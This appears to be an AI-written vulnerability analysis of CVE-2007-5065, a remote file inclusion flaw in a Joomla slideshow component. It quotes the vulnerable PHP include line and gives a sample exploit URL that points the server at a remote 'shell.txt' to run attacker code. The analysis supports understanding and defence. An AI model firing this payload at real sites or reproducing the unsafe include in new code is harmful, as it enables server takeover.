Based on the provided content, here's a breakdown of the vulnerability:

**CVE ID:** CVE-2007-5065

**Root Cause of Vulnerability:**
The vulnerability lies in the `admin.slideshow1.php` file of the `com_slideshow` Joomla component. The script directly includes a file using a variable `$mosConfig_live_site` which is controllable by user input via a GET parameter. This allows for Remote File Inclusion (RFI).

**Weaknesses/Vulnerabilities Present:**
- **Remote File Inclusion (RFI):** The primary vulnerability is RFI due to the insecure inclusion of a file path controlled by user input.
- **Lack of Input Sanitization:** The code fails to sanitize the user-supplied `$mosConfig_live_site` parameter, allowing the attacker to specify an arbitrary URL.

**Impact of Exploitation:**
- **Arbitrary Code Execution:** An attacker can include a remote file containing malicious PHP code, leading to arbitrary code execution on the server.
- **Server Compromise:** Successful exploitation can result in a complete compromise of the vulnerable server.

**Attack Vectors:**
- **HTTP GET Request:** The attacker sends a specially crafted HTTP GET request to the vulnerable script (`admin.slideshow1.php`), setting the `mosConfig_live_site` parameter to point to a malicious file hosted on an attacker-controlled server.

**Required Attacker Capabilities/Position:**
- **Network Access:** The attacker needs network access to the vulnerable Joomla instance.
- **Basic Web Knowledge:** The attacker needs basic understanding of HTTP requests and GET parameters to exploit the vulnerability.

**Technical Details:**

The vulnerable code snippet is:
```php
include( "$mosConfig_live_site/components/com_slideshow1/about.html" );
```

The provided exploit is:
```
http://domain.com/Joomla_Path/components/com_slideshow/admin.slideshow1.php?mosConfig_live_site=http://shell.txt
```

In this exploit:
- `http://domain.com/Joomla_Path/` represents the base URL of the vulnerable Joomla installation.
- `components/com_slideshow/admin.slideshow1.php` is the path to the vulnerable file.
- `?mosConfig_live_site=http://shell.txt` is the malicious GET parameter that points to a remotely hosted file named `shell.txt` containing malicious code that will be executed on the server.
